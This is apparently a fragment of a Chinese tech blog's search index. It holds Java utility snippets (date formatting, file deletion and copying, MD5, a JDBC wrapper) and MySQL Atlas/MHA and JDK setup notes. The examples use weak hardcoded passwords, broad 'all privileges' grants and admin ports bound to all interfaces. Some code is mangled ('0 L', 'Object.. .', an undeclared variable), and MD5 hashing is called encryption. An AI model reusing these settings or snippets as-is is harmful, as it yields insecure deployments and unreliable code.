} } /** * 将日期转换成长整型 * @param p_date 日期型时间 * @return long 长整型时间 */ public static long formatDateToInt(Date p_date) { if (p_date != null) { return p_date.getTime() / 1000; } return 0; } /** * 将字符串日期转换成长整类型日期 * @param strDate 字符串型时间 * @return long 长整型时间 */ public static long formatDateStringToInt(String strDate) { SimpleDateFormat format; Date time; if (strDate.trim().equals(\"\" )) return -1; String strAry[] = strDate.split( \":\"); if (strAry.length \u003e 1) format = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\" , Locale . getDefault()); else format = new SimpleDateFormat(\"yyyy-MM-dd\" , Locale.getDefault()); try { time = format.pa","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%97%A5%E6%9C%9F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/:0:0","tags":["linux","java","scripts"],"title":"Java日期格式化处理组件","uri":"/posts/scripts/java/%E6%97%A5%E6%9C%9F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/"},{"categories":["那些年的收藏"],"content":"文件处理组件","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/","tags":["linux","java","scripts"],"title":"java文件处理组件","uri":"/posts/scripts/java/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/"},{"categories":["那些年的收藏"],"content":" import java.io.File; import java.io.FileInputStream; import java.io.FileNotFoundException; import java.io.FileOutputStream; import java.io.FileWriter; import java.io.IOException; import java.io.InputStream; import java.io.PrintWriter; import com.ultrapower.eoms.common.RecordLog; /** * 文件处理组件 * @version Apr 21, 2010 5:50:00 PM */ public class FileOperUtil { /** * 删除目录下的所有文件 * @param path 文件夹路径 * @exception Exception */ public static void deleteFile(String path) throws Exception { File file = new File(path); if (file.isDirectory()) { File[] files = file.listFiles(); int len = files.length ; for (int i = 0; i \u003c len; i++) { deleteFile(files[i].getAbsolutePath()); } } file.delete(); } /** * 新建目录 * @param folderPath 文件夹路径 例如:c:/test */ public static void newFolder(String folderPath) { try { String filePath = folderPath; filePath = filePath.toString(); java.io.File myFilePath = new java.io.File(filePath); if (!myFilePath.exists()) { myFilePath.mkdir(); } } catch (Exception e) { RecordLog.printLog(\"新建目录,\"+folderPath+ \",出错,\"+e.getMessage(), RecordLog.LOG_LEVEL_ERROR); e.printStackTrace(); } } /** * 新建文件 * @param filePathAndName 文件路径 例如:c:/test/a.txt * @param fileContent 文件的内容 * @throws IOException */ public static void newFile(String filePathAndName, String fileContent) throws IOException { String filePath = filePathAndName; filePath = filePath.toString(); File myFilePath = new File(filePath); if (!myFilePath.exists()) { myFilePath.createNewFile(); } FileWriter resultFile = new FileWriter(myFilePath); PrintWriter myFile = new PrintWriter(resultFile); String strContent = fileContent; myFile.println(strContent); resultFile.close(); } /** * 删除文件 * * @param filePathAndName * 文件路径 例如:c:/test/a.txt */ public static void delFile(String filePathAndName) { try { String filePath = filePathAndName; filePath = filePath.toString(); java.io.File myDelFile = new java.io.File(filePath); myDelFile.delete(); } catch (Exception e) { RecordLog.printLog(\"删除文件,\"+filePathAndName+ \",出错,\"+e.getMessage(), RecordLog.LOG_LEVEL_ERROR); e.printStackTrace(); } } /** * 删除文件夹 * @param folderPath 文件夹路径 例如:c:/test * @return 如果删除成功,则返回 true;否则返回 false。 */ public static boolean delFolder(String folderPath) { boolean flag = false; try { delAllFile(folderPath); //删除完里面所有内容 String filePath = folderPath; filePath = filePath.toString(); java.io.File myFilePath = new java.io.File(filePath); flag = myFilePath.delete(); //删除空文件夹 } catch (Exception e) { RecordLog.printLog(\"删除文件夹,\"+folderPath+\",出错,\" +e.getMessage(), RecordLog .LOG_LEVEL_ERROR); e.printStackTrace(); } return flag; } /** * 删除文件夹里面的所有文件 * @param path 文件夹路径 例如:c:/test */ public static void delAllFile(String path) { File file = new File(path); if (!file.exists()) { return; } if (!file.isDirectory()) { return; } String[] tempList = file.list(); File temp = null; for (int i = 0; i \u003c tempList.length; i++) { if (path.endsWith(File.separator)) { temp = new File(path + tempList[i]); } else { temp = new File(path + File.separator + tempList[i]); } if (temp.isFile()) { temp.delete(); } if (temp.isDirectory()) { delAllFile(path + \"/\" + tempList[i]); // 先删除文件夹里面的文件 delFolder(path + \"/\" + tempList[i]); // 再删除空文件夹 } } } /** * 复制单个文件 * @param oldPath 文件夹路径 例如:c:/test/a.txt * @param newPath 文件夹路径 例如:c:/test/a.txt * @throws IOException */ public static void copyFile(String oldPath, String newPath) throws IOException { int bytesum = 0; int byteread = 0; File oldfile = new File(oldPath); if (oldfile.exists()) { // 文件存在时 InputStream inStream = new FileInputStream(oldPath); // 读入原文件 FileOutputStream fs = new FileOutputStream(newPath); byte[] buffer = new byte[1444]; while ((byteread = inStream.read(buffer)) != -1) { bytesum += byteread; // 字节数 文件大小 System. out.println(bytesum); fs.write(buffer, 0, byteread); } inStream.close(); } } /** * 复制整个文件夹内容 * @param oldPath 文件夹路径 例如:c:/test * @param newPath 文件夹路径 例如:c:/abc */ public static void copyFolder(String oldPath, String newPath) { try { ( new File(newPath)).mkdirs(); // 如果文件夹不存在 则建立新文件夹 Fi","date":"2022-06-24","objectID":"/posts/scripts/java/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/:0:0","tags":["linux","java","scripts"],"title":"java文件处理组件","uri":"/posts/scripts/java/%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86%E7%BB%84%E4%BB%B6/"},{"categories":["那些年的收藏"],"content":"Md5加密算法","date":"2022-06-24","objectID":"/posts/scripts/java/md5%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/","tags":["linux","java","scripts"],"title":"java下的Md5加密算法","uri":"/posts/scripts/java/md5%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"},{"categories":["那些年的收藏"],"content":"java 下的 MD5 算法 /************************************************ MD5 算法的Java Bean @author:Topcat Tuppin Last Modified:10,Mar,2001 *************************************************/ import java.lang.reflect.*; /************************************************* md5 类实现了RSA Data Security, Inc.在提交给IETF 的RFC1321中的MD5 message -digest 算法。 *************************************************/ public class MD5 { /* 下面这些S11-S44实际上是一个4*4的矩阵，在原始的C实现中是用#define 实现的， 这里把它们实现成为static final是表示了只读，切能在同一个进程空间内的多个 Instance间共享*/ static final int S11 = 7; static final int S12 = 12; static final int S13 = 17; static final int S14 = 22; static final int S21 = 5; static final int S22 = 9; static final int S23 = 14; static final int S24 = 20; static final int S31 = 4; static final int S32 = 11; static final int S33 = 16; static final int S34 = 23; static final int S41 = 6; static final int S42 = 10; static final int S43 = 15; static final int S44 = 21; static final byte[] PADDING = {-128, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; /* 下面的三个成员是MD5计算过程中用到的3个核心数据，在原始的C实现中 被定义到MD5_CTX结构中 */ private long[] state = new long[4]; // state (ABCD) private long[] count = new long[2]; // number of bits, modulo 2^64 (lsb first) private byte[] buffer = new byte[64]; // input buffer /* digestHexStr是MD5的唯一一个公共成员，是最新一次计算结果的 16进制ASCII表示. */ public String digestHexStr; /* digest,是最新一次计算结果的2进制内部表示，表示128bit的MD5值. */ private byte[] digest = new byte[16]; /* getMD5ofStr是类MD5最主要的公共方法，入口参数是你想要进行MD5变换的字符串 返回的是变换完的结果，这个结果是从公共成员digestHexStr取得的． */ public String getMD5ofStr(String inbuf) { md5Init(); md5Update(inbuf.getBytes(), inbuf.length()); md5Final(); digestHexStr = \"\"; for (int i = 0; i \u003c 16; i++) { digestHexStr += byteHEX(digest[i]); } return digestHexStr; } // 这是MD5这个类的标准构造函数，JavaBean要求有一个public的并且没有参数的构造函数 public MD5() { md5Init(); return; } /* md5Init是一个初始化函数，初始化核心变量，装入标准的幻数 */ private void md5Init() { count[0] = 0 L; count[1] = 0 L; ///* Load magic initialization constants. state[0] = 0x67452301 L; state[1] = 0xefcdab89 L; state[2] = 0x98badcfe L; state[3] = 0x10325476 L; return; } /* F, G, H ,I 是4个基本的MD5函数，在原始的MD5的C实现中，由于它们是 简单的位运算，可能出于效率的考虑把它们实现成了宏，在java中，我们把它们 实现成了private方法，名字保持了原来C中的。 */ private long F(long x, long y, long z) { return (x \u0026 y) | ((~x) \u0026 z); } private long G(long x, long y, long z) { return (x \u0026 z) | (y \u0026 (~z)); } private long H(long x, long y, long z) { return x ^ y ^ z; } private long I(long x, long y, long z) { return y ^ (x | (~z)); } /* FF,GG,HH和II将调用F,G,H,I进行近一步变换 FF, GG, HH, and II transformations for rounds 1, 2, 3, and 4. Rotation is separate from addition to prevent recomputation. */ private long FF(long a, long b, long c, long d, long x, long s, long ac) { a += F(b, c, d) + x + ac; a = ((int) a \u003c\u003c s) | ((int) a \u003e\u003e\u003e (32 - s)); a += b; return a; } private long GG(long a, long b, long c, long d, long x, long s, long ac) { a += G(b, c, d) + x + ac; a = ((int) a \u003c\u003c s) | ((int) a \u003e\u003e\u003e (32 - s)); a += b; return a; } private long HH(long a, long b, long c, long d, long x, long s, long ac) { a += H(b, c, d) + x + ac; a = ((int) a \u003c\u003c s) | ((int) a \u003e\u003e\u003e (32 - s)); a += b; return a; } private long II(long a, long b, long c, long d, long x, long s, long ac) { a += I(b, c, d) + x + ac; a = ((int) a \u003c\u003c s) | ((int) a \u003e\u003e\u003e (32 - s)); a += b; return a; } /* md5Update是MD5的主计算过程， inbuf是要变换的字节串， inputlen是长度，这个 函数由getMD5ofStr调用，调用之前需要调用md5init，因此把它设计成private的 */ private void md5Update(byte[] inbuf, int inputLen) { int i, index, partLen; byte[] block = new byte[64]; index = (int)(count[0] \u003e\u003e\u003e 3) \u0026 0x3F; // /* Update number of bits */ if ((count[0] += (inputLen \u003c\u003c 3)) \u003c (inputLen \u003c\u003c 3)) count[1]++; count[1] += (inputLen \u003e\u003e\u003e 29); partLen = 64 - index; // Transform as many times as possible. if (inputLen \u003e= partLen) { md5Memcpy(buffer, inbuf, index, 0, partLen); md5Transform(buffer); for (i = partLen; i + 63 \u003c inputLen; i += 64","date":"2022-06-24","objectID":"/posts/scripts/java/md5%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/:0:0","tags":["linux","java","scripts"],"title":"java下的Md5加密算法","uri":"/posts/scripts/java/md5%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"},{"categories":["那些年的收藏"],"content":"Java Jdbc连接封装","date":"2022-06-24","objectID":"/posts/scripts/java/jdbc%E8%BF%9E%E6%8E%A5%E5%B0%81%E8%A3%85/","tags":["linux","java","scripts"],"title":"Jdbc连接封装","uri":"/posts/scripts/java/jdbc%E8%BF%9E%E6%8E%A5%E5%B0%81%E8%A3%85/"},{"categories":["那些年的收藏"],"content":"java 的jdbc 连接封装 import java.sql.Connection; import java.sql.DriverManager; import java.sql.PreparedStatement; import java.sql.CallableStatement; import java.sql.ResultSet; import java.sql.SQLException; import java.sql.Timestamp; import java.util.ArrayList; import java.util.Date; import java.util.List; import com.sun.corba.se.spi.orbutil.fsm.Guard.Result; public class DB { // 数据库驱动类 private final static String DRIVER_NAME = \"oracle.jdbc.driver.OracleDriver\"; // 数据库URL地址 private static final String URL = \"jdbc:oracle:thin:@localhost:1521:orcl\"; // 数据库用户名 private static final String USERNAME = \"scott\"; // 密码 private static final String PASSWORD = \"tiger\"; private Connection con = null; private PreparedStatement ps = null; private ResultSet rs = null; static { try { Class.forName(DRIVER_NAME); } catch (ClassNotFoundException e) { e.printStackTrace(); } } /** * 获得数据库连接 * * @return 数据库连接 */ public Connection getConnection() throws ClassNotFoundException, SQLException { if (con == null) { con = DriverManager.getConnection(URL, USERNAME, PASSWORD); } return con; } public ResultSet executeQuery(String sql, Object...params) throws ClassNotFoundException, SQLException { con = this.getConnection(); ps = con.prepareStatement(sql); for (int i = 0; i \u003c params.length; i++) { Object o = params[i]; if (o instanceof Date) { Date d = (Date) o; Timestamp t = new Timestamp(d.getTime()); ps.setTimestamp(i + 1, t); } else { ps.setObject(i + 1, o); } } rs = ps.executeQuery(); return rs; } /** * 执行查询操作，返回一个结果接 * * @param sql 要执行的SQL语句 * @param list SQL参数的集合 * @return 结果集 * @throws SQLException * @throws ClassNotFoundException */ public ResultSet executeQuery(String sql, List list) throws ClassNotFoundException, SQLException { con = this.getConnection(); // 获得预编译语句对象 ps = con.prepareStatement(sql); // 传递参数 if (list != null) { for (int i = 0; i \u003c list.size(); i++) { Object o = list.get(i); if (o instanceof Date) { Date d = (Date) o; Timestamp t = new Timestamp(d.getTime()); ps.setTimestamp(i + 1, t); } else { ps.setObject(i + 1, o); } } } rs = ps.executeQuery(); return rs; } public int executeUpdate(String sql, Object...params) throws ClassNotFoundException, SQLException { con = this.getConnection(); ps = con.prepareStatement(sql); for (int i = 0; i \u003c params.length; i++) { Object o = params[i]; if (o instanceof Date) { Date d = (Date) o; Timestamp t = new Timestamp(d.getTime()); ps.setTimestamp(i + 1, t); } else { ps.setObject(i + 1, o); } } return ps.executeUpdate(); } /** * 执行增删改语句，返回受影响的行数 * @param sql sql语句 * @param list sql语句的参数集合 */ public int executeUpdate(String sql, List list) throws ClassNotFoundException, SQLException { con = this.getConnection(); ps = con.prepareStatement(sql); if (list != null) { for (int i = 0; i \u003c list.size(); i++) { Object o = list.get(i); if (o instanceof Date) { Date d = (Date) o; Timestamp t = new Timestamp(d.getTime()); ps.setTimestamp(i + 1, t); } else { ps.setObject(i + 1, o); } } } return ps.executeUpdate(); } /** * 无参数的存储过程 * * @throws SQLException * @throws ClassNotFoundException */ public void prepareCall(String storename, Object... params) throws ClassNotFoundException, SQLException { con = this.getConnection(); String str = \" call \"+ storename; cs = con.prepareCall(str); for (int i = 0; i \u003c params.length; i++) { Object o = params[i]; if (o instanceof Date) { Date d = (Date) o; Timestamp t = new Timestamp(d.getTime()); cs.setTimestamp(i + 1, t); } else { cs.setObject(i + 1, o); } } cs.execute(); } /** * 调用有输出参数 (输出参数类型只能为Stirng类型的数据)的存储过程 * * @throws List\u003cInteger\u003e 指定注册类型 * @throws SQLException * @throws ClassNotFoundException */ public List\u003cString\u003e prepareCall(String storename, List\u003cInteger\u003e list, Object.. . params) throws ClassNotFoundException, SQLException { con = this.getConnection(); String str = \" call \"+ storename; cs = con.prepareCall(str); List\u003cInteger\u003e klist = new ArrayList\u003cInteger\u003e(); List\u003cString\u003e relist = new ArrayList\u003cString\u003e(); if (params.length != 0) { for (int i = 0; i \u003c params.length; i++) { Ob","date":"2022-06-24","objectID":"/posts/scripts/java/jdbc%E8%BF%9E%E6%8E%A5%E5%B0%81%E8%A3%85/:0:0","tags":["linux","java","scripts"],"title":"Jdbc连接封装","uri":"/posts/scripts/java/jdbc%E8%BF%9E%E6%8E%A5%E5%B0%81%E8%A3%85/"},{"categories":["linux","运维记事"],"content":"Jdk环境变量配置","date":"2022-06-24","objectID":"/posts/linux/jdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/","tags":["linux","java"],"title":"JDK环境变量配置","uri":"/posts/linux/jdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"windows 新建JAVA_HOME变量：JAVA_HOME=C:\\Program Files\\Java\\jdk1.8.0_191 新建CLASSPATH变量，变量值为：.;%JAVA_HOME%\\lib;%JAVA_HOME%\\lib\\tools.jar 在path变量添加变量值：%JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin linux 1. 配置文件方式修改 [root@00 ~]# vi /etc/profile ## vi ~/.bash_profile export JAVA_HOME=/opt/java_1.8.0_45 export PATH=$JAVA_HOME/bin:$PATH export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar [root@00 ~]# source /etc/profile ## source ~/.bash_profile 2. 通过命令update-alternatives 管理 多版本共存时切换很方便： http://www.open-open.com/lib/view/open1452089422355.html ## 第一个参数--install表示向update-alternatives注册服务名。 ## 第二个参数是注册最终地址，成功后将会把命令在这个固定的目的地址做真实命令的软链，以后管理就是管理这个软链； ## 第三个参数：服务名，以后管理时以它为关联依据。 ## 第四个参数，被管理的命令绝对路径。 ## 第五个参数，优先级，数字越大优先级越高。 [root@00 ~]# update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_121/bin/java 1070 [root@00 ~]# update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_121/bin/javac 1070 [root@00 ~]# update-alternatives --install /usr/bin/jar jar /opt/jdk1.8.0_121/bin/jar 1070 [root@00 ~]# update-alternatives --install /usr/bin/javah javah /opt/jdk1.8.0_121/bin/javah 1070 [root@00 ~]# update-alternatives --install /usr/bin/javap javap /opt/jdk1.8.0_121/bin/javap 1070 [root@00 ~]# update-alternatives --config java ","date":"2022-06-24","objectID":"/posts/linux/jdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/:0:0","tags":["linux","java"],"title":"JDK环境变量配置","uri":"/posts/linux/jdk%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E9%85%8D%E7%BD%AE/"},{"categories":["linux","运维记事"],"content":"Mysql Atlas高可用软件","date":"2022-06-24","objectID":"/posts/mysql/atlas%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/","tags":["linux","mysql"],"title":"Mysql Atlas高可用软件","uri":"/posts/mysql/atlas%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"Atlas 主要功能 读写分离 从库负载均衡 IP 过滤 SQL 语句黑白名单 自动分表 https://github.com/Qihoo360/Atlas 接 MHA 高可用集群后，软件也可单独使用 注意事项: Atlas 只能运行在 x64 系统上 Mysql 版本应大于 5.1,建议使用 5.6 以上 安装 $\u003e yum install Atlas-2.2.1.el6.x86_64.rpm # 配置文件(可动态修改，不用重启) $\u003e cd /usr/local/mysql-proxy/conf \u0026\u0026 cp -v test.cnf instance.cnf $\u003e vim /usr/local/mysql-proxy/conf/instance.cnf [mysql-proxy] # 带#号的为非必需的配置项目 # 管理接口的用户名 admin-username = user # 管理接口的密码 admin-password = pwd # Atlas后端连接的MySQL主库的IP和端口，可设置多项，用逗号分隔 ## 提供写入服务(一般为主库)的地址，建议VIP的地址 proxy-backend-addresses = 10.0.2.9:3306 #Atlas后端连接的MySQL从库的IP和端口，@后面的数字代表权重，用来作负载均衡，若省略则默认为1，可设置多项，用逗号分隔 ## 只读(从库)库的地址 proxy-read-only-backend-addresses = 10.0.2.25:3305@1,10.0.2.27:3305@1 #用户名与其对应的加密过的MySQL密码，密码使用PREFIX/bin目录下的加密程序encrypt加密，下行的user1和user2为示例，将其替换为你的MySQL的用户名和加密密码！ # 此处配的的密码为前端DBA、程序等用户连接mysql的用户名密码，必须在此处声明一下 pwds = user1:+jKsgB3YAG8=, user2:GS+tr4TPgqc= #设置Atlas的运行方式，设为true时为守护进程方式，设为false时为前台方式，一般开发调试时设为false，线上运行时设为true,true后面不能有空格。 daemon = true #设置Atlas的运行方式，设为true时Atlas会启动两个进程，一个为monitor，一个为worker，monitor在worker意外退出后会自动将其重启，设为false时只有worker，没有monitor，一般开发调试时设为false，线上运行时设为true,true后面不能有空格。 keepalive = true #工作线程数，对Atlas的性能有很大影响，可根据情况适当设置 event-threads = 8 #日志级别，分为message、warning、critical、error、debug五个级别 log-level = message #日志存放的路径 log-path = /usr/local/mysql-proxy/log #SQL日志的开关，可设置为OFF、ON、REALTIME，OFF代表不记录SQL日志，ON代表记录SQL日志，REALTIME代表记录SQL日志且实时写入磁盘，默认为OFF ## 用于记录实时的sql操作日志，用于审计 #sql-log = OFF #慢日志输出设置。当设置了该参数时，则日志只输出执行时间超过sql-log-slow（单位：ms)的日志记录。不设置该参数则输出全部日志。 #sql-log-slow = 10 #实例名称，用于同一台机器上多个Atlas实例间的区分 #instance = test # Atlas监听的工作接口IP和端口 proxy-address = 0.0.0.0:33060 # Atlas监听的管理接口IP和端口 ## 用于管理atlas的端口 admin-address = 0.0.0.0:2345 #分表设置，此例中person为库名，mt为表名，id为分表字段，3为子表数量，可设置多项，以逗号分隔，若不分表则不需要设置该项 #tables = person.mt.id.3 #默认字符集，设置该项后客户端不再需要执行SET NAMES语句 ## 此项一定要和数据库字符集一致 #charset = utf8 #允许连接Atlas的客户端的IP，可以是精确IP，也可以是IP段，以逗号分隔，若不设置该项则允许所有IP连接，否则只允许列表中的IP连接 #client-ips = 127.0.0.1, 192.168.1 #Atlas前面挂接的LVS的物理网卡的IP(注意不是虚IP)，若有LVS且设置了client-ips则此项必须设置，否则可以不设置 #lvs-ips = 192.168.1.1 基本管理 登陆 ","date":"2022-06-24","objectID":"/posts/mysql/atlas%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/:0:0","tags":["linux","mysql"],"title":"Mysql Atlas高可用软件","uri":"/posts/mysql/atlas%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"Mysql MHA高可用软件","date":"2022-06-24","objectID":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/","tags":["linux","mysql"],"title":"Mysql MHA高可用软件","uri":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"MHA(Master HA) 高可用软件 自动主从切换工具 https://github.com/yoshinorim/mha4mysql-manager https://github.com/yoshinorim/mha4mysql-node 基础环境 环境准备(1管理, 1主2从): manager: 172.16.10.10(10.0.2.10) master01: 172.16.10.25(10.0.2.25) slave01: 172.16.10.26(10.0.2.26) slave02: 172.16.10.27(10.0.2.27) 准备 关闭所有节点relay_log自动清理功能 # 临时 sql\u003e set global relay_log_purge = 0; # 永久 $\u003e vim /etc/my.cnf relay_log_purge = 0 设置从库只读功 sql\u003e set global read_only=1 各个节点互连 $\u003e ssh-keygen $\u003e ssh-copy-id root@10.0.2.25 $\u003e ssh-copy-id root@10.0.2.26 $\u003e ssh-copy-id root@10.0.2.27 安装 ## 所有节点安装mha node软件包 # mha node 软件包依赖 $\u003e yum install perl-DBD-MySQL -y ## mha node 软件安装 $\u003e yum install -y mha4mysql-node-0.58-0.el7.centos.noarch.rpm ## 主库添加MHA管理用户 $\u003e mysql -uroot -e \"grant all privileges on *.* to mha@'10.0.2.%' identified by 'mha';\" ## 管理机安装manager软件(管理节点安装，建议独立一台或非主节点服务器) # 依赖环境 $\u003e yum install perl-Config-Tiny epel-release perl-Log-Dispatch perl-Parallel-ForkManager perl-Time-HiRes -y # mha manager 软件安装 $\u003e yum install perl-Config-Tiny epel-release perl-Log-Dispatch perl-Parallel-ForkManager perl-Time-HiRes -y $\u003e yum install mha4mysql-manager-0.58-0.el7.centos.noarch.rpm -y # 创建配置文件目录 $\u003e mkdir /etc/mha $\u003e mkdir -p /var/log/mha/app1 $\u003e vim /etc/mha/app1.cnf [server default] # 用于管理stop slave,change master,reset slave等操作的账号，缺省为root user=mha password=mha # mha manager生成的日志据对路径，如果没有设置，mha manager将打印在标准输出，标准错误输出上 manager_log=/var/log/mha/app1/manager # mha manager生成的相关状态文件的绝对路径，如果没有设置，则默认使用/var/tmp manager_workdir=/var/log/mha/app1 # 在master上生成binlog的绝对路径 master_binlog_dir=/data/mysqldb/binlog # 这个参数表示mha manager多久ping（执行select ping sql语句）一次master，连续三个丢失ping连接，mha master就判定mater死了，因此，通过4次ping间隔的最大时间的机制来发现故障，默认是3，表示间隔是3秒 ping_interval=2 # repl_user参数指定的用户名密码 repl_user=repl repl_password=123123 # 访问MHA manger和MHA mysql节点的OS系统帐号 ssh_user=root # \u003e https://www.cnblogs.com/xiaoboluo768/p/5973827.html # 故障时自动调用的脚本，一般用于自动vip漂移 master_ip_failover_script=/usr/local/bin/master_ip_failover # 故障时发送报告调用的脚本 # report_script= # 节点信息配置，下列顺序将影响选主的权重，号码越小权重越高 [server1] hostname=10.0.2.25 port=3306 [server2] hostname=10.0.2.26 port=3306 [server3] hostname=10.0.2.27 port=3306 # binlogserver配置，要求一台额外的机器，mysql 5.6以上，支持gtid并开启, 其作用是用于同步主库的binlog内容 # 必须叫这个名字binlog1，是MHA定义好的 [binlog1] # 永远不会被选主 no_master=1 hostname=10.0.2.27 port=3306 # 需要手动创建这个目录，并目录不能与原目录一致 master_binlog_dir=/data/mysqldb/binlog-server # 状态检查 ## 互信状态检查 $\u003e masterha_check_ssh --conf=/etc/mha/app1.cnf ## 主从状态检查 $\u003e masterha_check_repl --conf=/etc/mha/app1.cnf # 开启MHA --remove_dead_master_conf 自动将故障节点从配置文件中移除 --ignore_last_failover $\u003e nohup masterha_manager --conf=/etc/mha/app1.cnf --remove_dead_master_conf --ignore_last_failover \u003c /dev/null \u003e /var/log/mha/app1/manager.log 2\u003e\u00261 \u0026 # 查看MHA状态 $\u003e masterha_check_status --conf=/etc/mha/app1.cnf 故障演示 监控MHA Manager日志/var/log/mha/manager，手动关闭mysql主库(10.0.2.25), 日志体现，开始检查主库状态，在每隔2秒检查共3次后，第四次仍然检查失败，自动切换主库为第二个节点(10.0.2.26-自动计算), 从配置文件中删除故障节点配置，并自动关闭MHA Manager程序。 故障解决 恢复故障主节点，并将故障主节点作为从节点重新恢复(生产环境建议直接重建加入)加入到集群内部去(在MHA Manager管理日志中,会包含恢复时该执行的命令change master xxxx), 执行change master xxxx(mha日志中有体现)，然后start salve，最后手动添加故障节点配置到mha配置文件(/etc/mha/app1.cnf)中，重新启动mha管理 MHA binlongserver # 1. binlogserver配置，要求一台额外的机器，mysql 5.6以上，支持gtid并开启, 其作用是用于同步主库的binlog内容 $\u003e vim /etc/mha/app1.cnf # 必须叫这个名字binlog1，是MHA定义好的 [binlog1] # 永远不会被选主 no_master=1 hostname=10.0.2.27 port=3306 # 需要手动创建这个目录，并目录不能与原目录一致 master_binlog_dir=/data/mysqldb/binlog-server # 2. 配置节点创建对应目录(权限) $\u003e mkdir -p /data/mysqldb/binlog-server # 3. 拉取主库的binlog日志,先确认下主库是从多少开始的 show binary logs; 需全部拉取下来 # binlog拉取本身和mha没什么关系，但需要在mha启动是前处理好，否这mha将无法正常启动 $\u003e cd /data/mysqldb/binlog-server \u0026\u0026 mysqlbinlog -R --host=10.0.2.26 --user=mha --password=mha --raw --stop-never mysql-bin.000001 \u0026 # 4. 重启mha $\u003e masterha_stop --conf=/etc/mha/app1.cnf $\u003e nohup masterha_manager --conf=/etc/mha/app1.cnf --remove_dead_master_conf --ignore_last_failover \u003c /dev/null \u003e /var/log/mha/app1/manager.log 2\u003e\u00261 \u0026 # 5. 故障演示 # 主库宕机，binlogserver自动停止，manager也会自动停止 # 主库宕机，binlogserver日志也是无效了，需要重新同步 # 解决","date":"2022-06-24","objectID":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/:0:0","tags":["linux","mysql"],"title":"Mysql MHA高可用软件","uri":"/posts/mysql/mha%E9%AB%98%E5%8F%AF%E7%94%A8%E8%BD%AF%E4%BB%B6/"},{"categories":["linux","运维记事"],"content":"Mysql安装","date":"2022-06-24","objectID":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/","tags":["linux","mysql"],"title":"Mysql安装","uri":"/posts/mysql/mysql%E5%AE%89%E8%A3%85/"},{"categories":["linux","运维记事"],"content":"版本选择 选择GA版本 6-12 个月的产品(对于开发来说,单数版本一般为测试版本) 编译安装 yum install -y ncurses-devel libaio-devel cmake openssl-devel cmake . -DCMAKE_INSTALL_PREFIX=/opt/software/mysql-5.6.48 \\ -DMYSQL_DATADIR=/opt/software/mysql-server/data \\ -DMYSQL_UNIX_ADDR=/opt/software/mysql-server/mysql.sock \\ -DDEFAULT_CHARSET=utf8 \\ -DDEFAULT_COLLATION=utf8_general_ci \\ -DWITH_EXTRA_CHARSETS=all \\ -DWITH_INNOBASE_STORAGE_ENGINE=1 \\ -DWITH_FEDERATED_STORAGE_ENGINE=1 \\ -DWITH_BLACKHOLE_STORAGE_ENGINE=1 \\ -DWITHOUT_EXAMPLE_STORAGE_ENGINE=1 \\ -DWITH_ZLIB=bundled \\ -DWITH_SSL=system \\ -DENABLED_LOCAL_INFILE=1 \\ -DWITH_EMBEDDED_SERVER=1 \\ -DENABLE_DOWNLOADS=1 \\ -DWITH_DEBUG=0 初始化 初始化数据目录 以下是根据多实例配置来初始化一些信息的,可根据实际情况修改,另外程序是官方的二进制程序,如果是自己编译的,在指定了默认参数的情况下,下列描述的一些问题应该并不存在 # 简单示例 $\u003e mkdir /data/mysql56/3307/{data,logs,tmp} -p # 注意修正权限 $\u003e cat /data/mysql56/3307/my.cnf # 示例配置 [client] default-character-set = utf8mb4 socket = /data/mysql56/3307/mysql.sock [mysql] default-character-set = utf8mb4 socket = /data/mysql56/3307/mysql.sock [mysqld] port=3307 bind-address = 0.0.0.0 socket = /data/mysql56/3307/mysql.sock pid-file = /data/mysql56/3307/mysql.pid basedir = /opt/mysql56 datadir = /data/mysql56/3307/data tmpdir = /data/mysql56/3307/tmp log-error=/data/mysql56/3307/logs/mysqld.log skip-name-resolve 5.7 5.7已经没有mysql_install_db初始化脚本,现通过mysqld进行初始化,其他配置参考5.6的配置方案 